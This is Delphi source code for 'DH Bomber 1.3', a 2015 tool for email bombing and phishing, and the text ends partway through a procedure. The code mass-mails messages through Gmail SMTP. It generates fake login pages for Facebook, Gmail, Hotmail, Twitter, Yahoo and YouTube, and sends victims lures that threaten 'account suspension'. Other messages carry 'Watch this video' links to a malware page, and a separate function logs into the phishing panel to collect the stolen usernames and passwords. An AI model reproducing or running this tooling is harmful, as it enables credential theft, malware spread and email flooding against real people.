// DH Bomber 1.3
// (C) Doddy Hackman 2015
// You Need intall http://slproweb.com/products/Win32OpenSSL.html

unit bomber;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.Menus, Vcl.StdCtrls,
  IdComponent, IdTCPConnection, IdTCPClient, IdExplicitTLSClientServerBase,
  IdMessageClient, IdBaseComponent, IdMessage, IdSMTPBase, IdSMTP, IdAttachment,
  IdAttachmentFile, IdSSLOpenSSL, IdGlobal, IdCookieManager, IdHTTP,
  IdMultipartFormData, PerlRegEx, Vcl.Imaging.pngimage, Vcl.ExtCtrls, ShellAPI,
  IdHash, IdHashMessageDigest;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    StatusBar1: TStatusBar;
    MainMenu1: TMainMenu;
    PageControl2: TPageControl;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    GroupBox1: TGroupBox;
    username: TEdit;
    GroupBox2: TGroupBox;
    password: TEdit;
    GroupBox3: TGroupBox;
    count: TEdit;
    GroupBox4: TGroupBox;
    time: TEdit;
    GroupBox5: TGroupBox;
    subject: TEdit;
    body: TMemo;
    TabSheet5: TTabSheet;
    PageControl3: TPageControl;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    TabSheet8: TTabSheet;
    GroupBox6: TGroupBox;
    page: TEdit;
    Label1: TLabel;
    mysql_host: TEdit;
    Label2: TLabel;
    mysql_username: TEdit;
    Label3: TLabel;
    mysql_password: TEdit;
    Label4: TLabel;
    mysql_database: TEdit;
    passwords: TListView;
    TabSheet9: TTabSheet;
    GroupBox7: TGroupBox;
    malware: TEdit;
    M1: TMenuItem;
    F1: TMenuItem;
    U1: TMenuItem;
    A1: TMenuItem;
    E1: TMenuItem;
    S1: TMenuItem;
    A2: TMenuItem;
    A3: TMenuItem;
    A4: TMenuItem;
    C1: TMenuItem;
    TabSheet10: TTabSheet;
    GroupBox8: TGroupBox;
    mailist: TListBox;
    TabSheet11: TTabSheet;
    TabSheet12: TTabSheet;
    GroupBox9: TGroupBox;
    console: TMemo;
    GenerateFakes1: TMenuItem;
    L1: TMenuItem;
    SendFakes1: TMenuItem;
    SendXploits1: TMenuItem;
    SendURLMalware1: TMenuItem;
    GroupBox10: TGroupBox;
    archivo: TEdit;
    Button1: TButton;
    abrir: TOpenDialog;
    M2: TMenuItem;
    C2: TMenuItem;
    nave: TIdHTTP;
    cookies: TIdCookieManager;
    GroupBox11: TGroupBox;
    GroupBox12: TGroupBox;
    admin_user: TEdit;
    admin_pass: TEdit;
    Image1: TImage;
    A5: TMenuItem;
    D1: TMenuItem;
    F2: TMenuItem;
    G1: TMenuItem;
    H1: TMenuItem;
    T1: TMenuItem;
    Y1: TMenuItem;
    Y2: TMenuItem;
    A6: TMenuItem;
    GroupBox13: TGroupBox;
    Image2: TImage;
    Label5: TLabel;
    menu: TPopupMenu;
    A7: TMenuItem;
    A8: TMenuItem;
    procedure enviate_esta(username, password, toto, subject, body: string);
    procedure E1Click(Sender: TObject);
    procedure A1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure A4Click(Sender: TObject);
    procedure M2Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure A3Click(Sender: TObject);
    procedure L1Click(Sender: TObject);
    procedure GenerateFakes1Click(Sender: TObject);
    procedure SendURLMalware1Click(Sender: TObject);
    procedure A5Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure SendXploits1Click(Sender: TObject);
    procedure F2Click(Sender: TObject);
    procedure G1Click(Sender: TObject);
    procedure H1Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure Y1Click(Sender: TObject);
    procedure Y2Click(Sender: TObject);
    procedure A6Click(Sender: TObject);
    procedure A7Click(Sender: TObject);
    procedure A8Click(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Functions

function md5_encode(text: string): string;
var
  md5: TIdHashMessageDigest5;
begin
  md5 := TIdHashMessageDigest5.Create;
  Result := IdGlobal.IndyLowerCase(md5.HashStringAsHex(text));
end;

function copy_dir(path1, path2: string): LongInt;
// Based on : http://www.clubdelphi.com/foros/showthread.php?t=21778
// Thanks to Investment
var
  archivos: TShFileOpStruct;
  aca, llegue: String;
begin
  try
    begin
      aca := path1 + #0;
      llegue := path2 + #0;
      Result := 0;
      with archivos do
      begin
        Wnd := Application.Handle;
        wFunc := FO_COPY;
        pFrom := @aca[1];
        pTo := @llegue[1];
        fFlags := FOF_ALLOWUNDO or FOF_NOCONFIRMATION
      end;
      Result := ShFileOperation(archivos);
    end;
  except
    //
  end;
end;

function borrar_dir(const target: String): Boolean;
// Based on : http://stackoverflow.com/questions/6757942/permanently-delete-directories
// Thanks to petersmileyface
var
  uno: TShFileOpStruct;
  dos: Integer;
begin
  try
    begin
      Result := False;
      if DirectoryExists(target) then
      begin
        FillChar(uno, SizeOf(uno), #0);
        uno.Wnd := 0;
        uno.wFunc := FO_DELETE;
        uno.pFrom := PChar(target + #0#0);
        uno.pTo := nil;
        uno.fFlags := FOF_SILENT or FOF_NOCONFIRMATION or FOF_NOERRORUI or
          FOF_NOCONFIRMMKDIR;
        uno.lpszProgressTitle := nil;
        dos := ShFileOperation(uno);
        Result := dos = 0;
      end;
    end;
  except
    //
  end;
end;

function readfile(const archivo: TFileName): String;
var
  lista: TStringList;
begin

  if (FileExists(archivo)) then
  begin
    lista := TStringList.Create;
    lista.Loadfromfile(archivo);
    Result := lista.text;
    lista.Free;
  end;
end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  AssignFile(ar, filename);
  FileMode := fmOpenWrite;

  if FileExists(filename) then
    Append(ar)
  else
    Rewrite(ar);

  Write(ar, texto);
  CloseFile(ar);

end;

procedure TForm1.enviate_esta(username, password, toto, subject, body: string);

// Based on : http://stackoverflow.com/questions/7717495/starttls-error-while-sending-email-using-indy-in-delphi-xe
// Thanks to TLama

var
  data: TIdMessage;
  mensaje: TIdSMTP;
  SSL: TIdSSLIOHandlerSocketOpenSSL;

begin

  mensaje := TIdSMTP.Create(nil);
  data := TIdMessage.Create(nil);
  SSL := TIdSSLIOHandlerSocketOpenSSL.Create(nil);

  SSL.MaxLineAction := maException;
  SSL.SSLOptions.Method := sslvTLSv1;
  SSL.SSLOptions.Mode := sslmUnassigned;
  SSL.SSLOptions.VerifyMode := [];
  SSL.SSLOptions.VerifyDepth := 0;

  data.From.Address := username;
  data.Recipients.EMailAddresses := toto;
  data.subject := subject;
  data.body.text := body;

  if FileExists(archivo.text) then
  begin
    TIdAttachmentFile.Create(data.MessageParts, archivo.text);
  end;

  mensaje.IOHandler := SSL;
  mensaje.Host := 'smtp.gmail.com';
  mensaje.Port := 587;
  mensaje.username := username;
  mensaje.password := password;
  mensaje.UseTLS := utUseExplicitTLS;

  mensaje.Connect;
  mensaje.Send(data);
  mensaje.Disconnect;

  mensaje.Free;
  data.Free;
  SSL.Free;

end;

//

procedure TForm1.A1Click(Sender: TObject);
begin
  ShowMessage('Coded By Doddy Hackman in the year 2015');
end;

procedure TForm1.A3Click(Sender: TObject);
var
  mail: string;
begin
  mail := InputBox('DH Bomber 1.3', 'Mail : ', '');
  if not(mail = '') then
  begin
    mailist.Items.Add(mail);
  end;
end;

procedure TForm1.A4Click(Sender: TObject);
var
  archivo_z: TextFile;
  lineas: String;
begin
  if abrir.Execute then
  begin
    AssignFile(archivo_z, abrir.filename);
    Reset(archivo_z);
    while not EOF(archivo_z) do
    begin
      ReadLn(archivo_z, lineas);
      mailist.Items.Add(lineas);
    end;
    CloseFile(archivo_z);
  end;
end;

procedure TForm1.A5Click(Sender: TObject);
begin
  if abrir.Execute then
  begin
    archivo.text := abrir.filename;
  end;
end;

procedure TForm1.A6Click(Sender: TObject);
begin

  username.text := '';
  password.text := '';
  count.text := '';
  time.text := '';
  subject.text := '';
  archivo.text := '';
  body.Clear;
  page.text := '';
  admin_user.text := '';
  admin_pass.text := '';
  mysql_host.text := '';
  mysql_username.text := '';
  mysql_password.text := '';
  mysql_database.text := '';
  passwords.Clear;
  malware.text := '';
  mailist.Clear;
  console.Clear;

end;

procedure TForm1.A7Click(Sender: TObject);
var
  mail: string;
begin
  mail := InputBox('DH Bomber 1.3', 'Mail : ', '');
  if not(mail = '') then
  begin
    mailist.Items.Add(mail);
  end;
end;

procedure TForm1.A8Click(Sender: TObject);
var
  archivo_z: TextFile;
  lineas: String;
begin
  if abrir.Execute then
  begin
    AssignFile(archivo_z, abrir.filename);
    Reset(archivo_z);
    while not EOF(archivo_z) do
    begin
      ReadLn(archivo_z, lineas);
      mailist.Items.Add(lineas);
    end;
    CloseFile(archivo_z);
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  if abrir.Execute then
  begin
    archivo.text := abrir.filename;
  end;
end;

procedure TForm1.C2Click(Sender: TObject);
begin
  console.Clear;
end;

procedure TForm1.D1Click(Sender: TObject);
begin
  archivo.text := '';
end;

procedure TForm1.E1Click(Sender: TObject);
begin
  Application.Terminate;
end;

procedure TForm1.F2Click(Sender: TObject);
var
  i: Integer;
  i2: Integer;
  asunto: string;
  mensaje: string;
  link: string;
  linktest: string;
  nombre: string;

begin

  console.Clear;

  link := page.text;
  linktest := page.text;

  linktest := StringReplace(linktest, 'http://', 'C:\',
    [rfReplaceAll, rfIgnoreCase]);
  linktest := StringReplace(linktest, '/', '\', [rfReplaceAll, rfIgnoreCase]);
  nombre := ExtractFileName(linktest);

  link := StringReplace(link, nombre, '', [rfReplaceAll, rfIgnoreCase]);
  link := link + '/Login/Facebook/Facebook.htm';

  asunto := 'Account Update';
  mensaje := 'Dear User,' + sLineBreak +
    'Our system detected an error in your account, we strongly advise you update your account to avoid account Suspension or De-activation.'
    + sLineBreak + 'Enter here : ' + link + ' to Sign in to resolve the error.'
    + sLineBreak + 'Thanks for your co-operation.' + sLineBreak + 'Regards,' +
    sLineBreak + 'Administration';

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin
    try
      begin
        StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake' + ' : Sending ' + ' ...';
        Form1.StatusBar1.Update;

        enviate_esta(username.text, password.text, mailist.Items[i2],
          asunto, mensaje);

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : OK ');
      end;
    except
      begin
        StatusBar1.Panels[0].text := '[-] Error Sending Message ...';

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : FAIL ');
        Form1.StatusBar1.Update;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;

end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  abrir.InitialDir := GetCurrentDir;
end;

procedure TForm1.G1Click(Sender: TObject);
var
  i: Integer;
  i2: Integer;
  asunto: string;
  mensaje: string;
  link: string;
  linktest: string;
  nombre: string;

begin

  console.Clear;

  link := page.text;
  linktest := page.text;

  linktest := StringReplace(linktest, 'http://', 'C:\',
    [rfReplaceAll, rfIgnoreCase]);
  linktest := StringReplace(linktest, '/', '\', [rfReplaceAll, rfIgnoreCase]);
  nombre := ExtractFileName(linktest);

  link := StringReplace(link, nombre, '', [rfReplaceAll, rfIgnoreCase]);
  link := link + '/Login/Gmail/Gmail.htm';

  asunto := 'Account Update';
  mensaje := 'Dear User,' + sLineBreak +
    'Our system detected an error in your account, we strongly advise you update your account to avoid account Suspension or De-activation.'
    + sLineBreak + 'Enter here : ' + link + ' to Sign in to resolve the error.'
    + sLineBreak + 'Thanks for your co-operation.' + sLineBreak + 'Regards,' +
    sLineBreak + 'Administration';

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin
    try
      begin
        StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake' + ' : Sending ' + ' ...';
        Form1.StatusBar1.Update;

        enviate_esta(username.text, password.text, mailist.Items[i2],
          asunto, mensaje);

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : OK ');
      end;
    except
      begin
        StatusBar1.Panels[0].text := '[-] Error Sending Message ...';

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : FAIL ');
        Form1.StatusBar1.Update;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;

end;

procedure TForm1.GenerateFakes1Click(Sender: TObject);
var
  dir: string;
  code: string;
begin

  StatusBar1.Panels[0].text := '[+] Working ...';
  Form1.StatusBar1.Update;

  dir := 'launcher';
  if not DirectoryExists(dir) then
  begin
    CreateDir(dir);
  end;

  if (FileExists(GetCurrentDir + '\Launcher')) then
  begin
    borrar_dir(GetCurrentDir + '\Launcher');
  end;

  copy_dir(GetCurrentDir + '\Configuration\*.*', GetCurrentDir + '\Launcher');

  code := readfile(GetCurrentDir + '\Launcher\index.php');

  code := StringReplace(code, 'USER_LOGIN', admin_user.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'PASS_LOGIN', md5_encode(admin_pass.text),
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_HOST', mysql_host.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_USER', mysql_username.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_PASS', mysql_password.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_DB', mysql_database.text,
    [rfReplaceAll, rfIgnoreCase]);

  code := StringReplace(code, 'USER_CORREO', username.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'PASS_CORREO', password.text,
    [rfReplaceAll, rfIgnoreCase]);

  DeleteFile(GetCurrentDir + '\Launcher\index.php');
  savefile(GetCurrentDir + '\Launcher\index.php', code);

  RenameFile(GetCurrentDir + '\Launcher\Fakes\',
    GetCurrentDir + '\Launcher\Login\');
  RenameFile(GetCurrentDir + '\Launcher\Malware\',
    GetCurrentDir + '\Launcher\Video\');

  code := readfile(GetCurrentDir + '\Launcher\Login\Facebook\login.php');
  DeleteFile(GetCurrentDir + '\Launcher\Login\Facebook\login.php');

  code := StringReplace(code, 'ACA_VA_TU_HOST', mysql_host.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_USER', mysql_username.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_PASS', mysql_password.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_DB', mysql_database.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Login\Facebook\login.php', code);

  code := readfile(GetCurrentDir + '\Launcher\Login\Gmail\login.php');
  DeleteFile(GetCurrentDir + '\Launcher\Login\Gmail\login.php');

  code := StringReplace(code, 'ACA_VA_TU_HOST', mysql_host.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_USER', mysql_username.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_PASS', mysql_password.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_DB', mysql_database.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Login\Gmail\login.php', code);

  code := readfile(GetCurrentDir + '\Launcher\Login\Hotmail\login.php');
  DeleteFile(GetCurrentDir + '\Launcher\Login\Hotmail\login.php');

  code := StringReplace(code, 'ACA_VA_TU_HOST', mysql_host.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_USER', mysql_username.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_PASS', mysql_password.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_DB', mysql_database.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Login\Hotmail\login.php', code);

  code := readfile(GetCurrentDir + '\Launcher\Login\Twitter\login.php');
  DeleteFile(GetCurrentDir + '\Launcher\Login\Twitter\login.php');

  code := StringReplace(code, 'ACA_VA_TU_HOST', mysql_host.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_USER', mysql_username.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_PASS', mysql_password.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_DB', mysql_database.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Login\Twitter\login.php', code);

  code := readfile(GetCurrentDir + '\Launcher\Login\Yahoo\login.php');
  DeleteFile(GetCurrentDir + '\Launcher\Login\Yahoo\login.php');

  code := StringReplace(code, 'ACA_VA_TU_HOST', mysql_host.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_USER', mysql_username.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_PASS', mysql_password.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_DB', mysql_database.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Login\Yahoo\login.php', code);

  code := readfile(GetCurrentDir + '\Launcher\Login\Youtube\login.php');
  DeleteFile(GetCurrentDir + '\Launcher\Login\Youtube\login.php');

  code := StringReplace(code, 'ACA_VA_TU_HOST', mysql_host.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_USER', mysql_username.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_PASS', mysql_password.text,
    [rfReplaceAll, rfIgnoreCase]);
  code := StringReplace(code, 'ACA_VA_TU_DB', mysql_database.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Login\Youtube\login.php', code);

  code := readfile(GetCurrentDir + '\Launcher\Video\Spanish\video.php');
  DeleteFile(GetCurrentDir + '\Launcher\Video\Spanish\video.php');

  code := StringReplace(code, 'ACA_VA_TU_LINK', malware.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Video\Spanish\video.php', code);

  code := readfile(GetCurrentDir + '\Launcher\Video\English\video.php');
  DeleteFile(GetCurrentDir + '\Launcher\Video\English\video.php');

  code := StringReplace(code, 'ACA_VA_TU_LINK', malware.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Video\English\video.php', code);

  code := readfile(GetCurrentDir + '\Launcher\Video\video.php');
  DeleteFile(GetCurrentDir + '\Launcher\Video\video.php');

  code := StringReplace(code, 'ACA_VA_TU_LINK', malware.text,
    [rfReplaceAll, rfIgnoreCase]);

  savefile(GetCurrentDir + '\Launcher\Video\video.php', code);

  StatusBar1.Panels[0].text := '[+] Done';
  Form1.StatusBar1.Update;

end;

procedure TForm1.H1Click(Sender: TObject);
var
  i: Integer;
  i2: Integer;
  asunto: string;
  mensaje: string;
  link: string;
  linktest: string;
  nombre: string;

begin

  console.Clear;

  link := page.text;
  linktest := page.text;

  linktest := StringReplace(linktest, 'http://', 'C:\',
    [rfReplaceAll, rfIgnoreCase]);
  linktest := StringReplace(linktest, '/', '\', [rfReplaceAll, rfIgnoreCase]);
  nombre := ExtractFileName(linktest);

  link := StringReplace(link, nombre, '', [rfReplaceAll, rfIgnoreCase]);
  link := link + '/Login/Hotmail/Hotmail.htm';

  asunto := 'Account Update';
  mensaje := 'Dear User,' + sLineBreak +
    'Our system detected an error in your account, we strongly advise you update your account to avoid account Suspension or De-activation.'
    + sLineBreak + 'Enter here : ' + link + ' to Sign in to resolve the error.'
    + sLineBreak + 'Thanks for your co-operation.' + sLineBreak + 'Regards,' +
    sLineBreak + 'Administration';

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin
    try
      begin
        StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake' + ' : Sending ' + ' ...';
        Form1.StatusBar1.Update;

        enviate_esta(username.text, password.text, mailist.Items[i2],
          asunto, mensaje);

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : OK ');
      end;
    except
      begin
        StatusBar1.Panels[0].text := '[-] Error Sending Message ...';

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : FAIL ');
        Form1.StatusBar1.Update;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;

end;

procedure TForm1.L1Click(Sender: TObject);
var
  regex: TPerlRegEx;
  datos: TIdMultiPartFormDataStream;
  code: string;
begin

  passwords.Clear;

  StatusBar1.Panels[0].text := '[+] Getting passwords ...';
  Form1.StatusBar1.Update;

  datos := TIdMultiPartFormDataStream.Create;
  datos.AddFormField('user', admin_user.text);
  datos.AddFormField('password', admin_pass.text);
  datos.AddFormField('login', 'Enter');
  nave.Post(page.text + '?poraca=', datos);
  code := nave.Get(page.text + '?poraca=');

  regex := TPerlRegEx.Create();
  regex.regex := '<td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>';
  regex.subject := code;

  while regex.MatchAgain do
  begin
    if not(regex.Groups[2] = '<b>Username</b>') then
    begin
      with passwords.Items.Add do
      begin
        Caption := regex.Groups[2];
        SubItems.Add(regex.Groups[3]);
        SubItems.Add(regex.Groups[4]);
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Done';
  Form1.StatusBar1.Update;
end;

procedure TForm1.M2Click(Sender: TObject);
begin
  mailist.Clear;
end;

procedure TForm1.S1Click(Sender: TObject);
var
  i: Integer;
  i2: Integer;
  count_z: Integer;
  idasunto: string;

begin

  console.Clear;

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin

    Sleep(StrToInt(time.text) * 1000);

    count_z := StrToInt(count.text);

    for i := 1 to count_z do
    begin

      if count_z > 1 then
      begin
        idasunto := '_' + IntToStr(i);
      end;

      try
        begin
          StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' '
            + '[+] Message Number ' + IntToStr(i) + ' : Sending ' + ' ...';
          Form1.StatusBar1.Update;

          enviate_esta(username.text, password.text, mailist.Items[i2],
            subject.text + idasunto, body.text);

          console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
            '[+] Message Number ' + IntToStr(i) + ' : OK ');
        end;
      except
        begin
          StatusBar1.Panels[0].text := '[-] Error Sending Message Number ' +
            IntToStr(i) + ' ...';

          console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
            '[+] Message Number ' + IntToStr(i) + ' : FAIL ');
          Form1.StatusBar1.Update;
        end;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;

end;

procedure TForm1.SendURLMalware1Click(Sender: TObject);
var
  i: Integer;
  i2: Integer;
  asunto: string;
  mensaje: string;
  link: string;
  linktest: string;
  nombre: string;

begin

  console.Clear;

  link := page.text;
  linktest := page.text;

  linktest := StringReplace(linktest, 'http://', 'C:\',
    [rfReplaceAll, rfIgnoreCase]);
  linktest := StringReplace(linktest, '/', '\', [rfReplaceAll, rfIgnoreCase]);
  nombre := ExtractFileName(linktest);

  link := StringReplace(link, nombre, '', [rfReplaceAll, rfIgnoreCase]);
  link := link + '/Video/video.php';

  asunto := 'Watch this video';
  mensaje := 'Watch this video is excellent : ' + link;

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin
    try
      begin
        StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Malware' + ' : Sending ' + ' ...';
        Form1.StatusBar1.Update;

        enviate_esta(username.text, password.text, mailist.Items[i2],
          asunto, mensaje);

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Malware ' + ' : OK ');
      end;
    except
      begin
        StatusBar1.Panels[0].text := '[-] Error Sending Message ...';

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Malware ' + ' : FAIL ');
        Form1.StatusBar1.Update;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;

end;

procedure TForm1.SendXploits1Click(Sender: TObject);
var
  i2: Integer;
  asunto: string;
  mensaje: string;
  link: string;
  linktest: string;
  nombre: string;

begin

  console.Clear;

  asunto := 'Actualizacion de cuenta';
  mensaje := readfile('Configuration/Xploits/Xploit1.txt');

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin
    try
      begin
        StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Xploit' + ' : Sending ' + ' ...';
        Form1.StatusBar1.Update;

        enviate_esta(username.text, password.text, mailist.Items[i2],
          asunto, mensaje);

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Xploit ' + ' : OK ');
      end;
    except
      begin
        StatusBar1.Panels[0].text := '[-] Error Sending Message ...';

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Xploit ' + ' : FAIL ');
        Form1.StatusBar1.Update;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;

end;

procedure TForm1.T1Click(Sender: TObject);
var
  i: Integer;
  i2: Integer;
  asunto: string;
  mensaje: string;
  link: string;
  linktest: string;
  nombre: string;

begin

  console.Clear;

  link := page.text;
  linktest := page.text;

  linktest := StringReplace(linktest, 'http://', 'C:\',
    [rfReplaceAll, rfIgnoreCase]);
  linktest := StringReplace(linktest, '/', '\', [rfReplaceAll, rfIgnoreCase]);
  nombre := ExtractFileName(linktest);

  link := StringReplace(link, nombre, '', [rfReplaceAll, rfIgnoreCase]);
  link := link + '/Login/Twitter/Twitter.htm';

  asunto := 'Account Update';
  mensaje := 'Dear User,' + sLineBreak +
    'Our system detected an error in your account, we strongly advise you update your account to avoid account Suspension or De-activation.'
    + sLineBreak + 'Enter here : ' + link + ' to Sign in to resolve the error.'
    + sLineBreak + 'Thanks for your co-operation.' + sLineBreak + 'Regards,' +
    sLineBreak + 'Administration';

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin
    try
      begin
        StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake' + ' : Sending ' + ' ...';
        Form1.StatusBar1.Update;

        enviate_esta(username.text, password.text, mailist.Items[i2],
          asunto, mensaje);

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : OK ');
      end;
    except
      begin
        StatusBar1.Panels[0].text := '[-] Error Sending Message ...';

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : FAIL ');
        Form1.StatusBar1.Update;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;
end;

procedure TForm1.Y1Click(Sender: TObject);
var
  i: Integer;
  i2: Integer;
  asunto: string;
  mensaje: string;
  link: string;
  linktest: string;
  nombre: string;

begin

  console.Clear;

  link := page.text;
  linktest := page.text;

  linktest := StringReplace(linktest, 'http://', 'C:\',
    [rfReplaceAll, rfIgnoreCase]);
  linktest := StringReplace(linktest, '/', '\', [rfReplaceAll, rfIgnoreCase]);
  nombre := ExtractFileName(linktest);

  link := StringReplace(link, nombre, '', [rfReplaceAll, rfIgnoreCase]);
  link := link + '/Login/Yahoo/Yahoo.htm';

  asunto := 'Account Update';
  mensaje := 'Dear User,' + sLineBreak +
    'Our system detected an error in your account, we strongly advise you update your account to avoid account Suspension or De-activation.'
    + sLineBreak + 'Enter here : ' + link + ' to Sign in to resolve the error.'
    + sLineBreak + 'Thanks for your co-operation.' + sLineBreak + 'Regards,' +
    sLineBreak + 'Administration';

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin
    try
      begin
        StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake' + ' : Sending ' + ' ...';
        Form1.StatusBar1.Update;

        enviate_esta(username.text, password.text, mailist.Items[i2],
          asunto, mensaje);

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : OK ');
      end;
    except
      begin
        StatusBar1.Panels[0].text := '[-] Error Sending Message ...';

